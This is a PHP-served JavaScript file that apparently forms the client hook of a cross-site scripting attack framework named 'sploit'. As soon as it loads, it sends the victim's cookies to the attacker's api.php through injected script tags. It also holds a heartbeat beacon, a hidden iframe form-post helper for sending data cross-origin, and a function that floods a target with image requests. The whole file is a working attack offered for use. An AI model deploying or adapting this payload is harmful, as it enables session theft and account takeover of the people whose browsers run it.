<?php
header('Content-type: text/javascript');
$id = (isset($_GET['id'])) ? $_GET['id'] : preg_replace("/[\+\/\=]/", "", base64_encode(openssl_random_pseudo_bytes(12)));
echo "var sploit = '{$_SERVER['HTTP_HOST']}';";
echo "var sploitapi = 'http://{$_SERVER['HTTP_HOST']}/api.php';";
echo "var sploitid = '$id';";
?>

var xsshid = "display:none;width:0;height:0;";
var gdebug = "";
function debug(message) { gdebug += message + ", "; }
function getCookie(name) {
	name += "="
    var ca = document.cookie.split(';');
    for(var i=0; i<ca.length; i++) {
        var c = ca[i].trim();
        if (c.indexOf(name) == 0) return c.substring(name.length,c.length);
    }
    return "";
}

function setCookie(cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays*24*60*60*1000));
	var expires = "expires="+d.toGMTString();
	document.cookie = cname + "=" + cvalue + "; " + expires;
}
function xssgbi(x) { return document.getElementById(x); }
function xssce(x) { return document.createElement(x); }
function xsssa(x,k,v) { return x.setAttribute(k,v); }
function xssrm(id) { var e = xssgbi(id); e.parentNode.removeChild(e); } 

function capture() {

}



function dos(p, num) { for(i=0;i<num;i++){document.write("<img src='"+p+"' />"); } }
function reg() {
	document.write("<div id='sploit' style='display:none'>text</div>");
	cs("http://"+sploit+"/api.php?reg="+sploitid+"&c="+encodeURIComponent(document.cookie));
}
function hb() { 
	if (window.top==window.self) { cs('http://'+sploit+'/api.php?id='+sploitid+"&d="+gdebug); gdebug = ""; }
}

function cs(s) { 
 // console.log("cs: " + s); 
	var script = document.createElement("script");
	script.type="text/javascript";
	script.src=s;
	var d = xssgbi("sploit");
	if (!d) { document.write("<div id='sploit' style='display:none'>text</div>");}
	d = xssgbi("sploit");
//console.log(d);
	d.appendChild(script);
}

/**
 * create an image. used for genertic GET requests
 * url: url
 * st: style attribute
 * id: element id to append the image to
 * err: onerror function (or false)
 * load: onload function (or false)
 */
function ci(url, st, id, err, load) { 
	var i = document.createElement('img');
	i.src=url;
	i.style=st;
	if (load) { xsssa(i, "onload", load); }
	if (err) { xsssa(i, "onerror", err); }
	xssgbi(id).append.Child(i);
}

/**
 * post data to another domain without Ajax (you never know....)
 * XSS Cross Origin Post
 * url: the url to post to
 * data: (dictionary) key value array of data to post
 * a: the api action (usually 'log')
 */
function xsscop(url, data, a) {
	// create elements
	var ifr = xssce('iframe');
	var frm = xssce('form');
	// set attributes
	xsssa(ifr, "name", "cspost");
	xsssa(ifr, "style", xsshid);
	xsssa(ifr, "id", "xsscop");
	xsssa(frm, "action", sploitapi+"?A="+a);
	xsssa(frm, "method", "post");
	xsssa(frm, "target", "cspost");

	// create an input for each post variable
	for (d in data) {
		var e = xssce("input");
		xsssa(e, "type", "hidden");
		xsssa(e, "name", d);
		xsssa(e, "value", data[d]);
		frm.appendChild(e);
	}

	// append form to iframe
	ifr.appendChild(frm);
	document.body.appendChild(ifr);
	// submit the form
	frm.submit();
	// remove the frame
	xssrm("xsscop");
}


function xssappend(t) { xssgbi('sploit').innerHTML+=t; }
function xsscls(t) { xssgbi('sploit').innerHTML=""; }

reg();

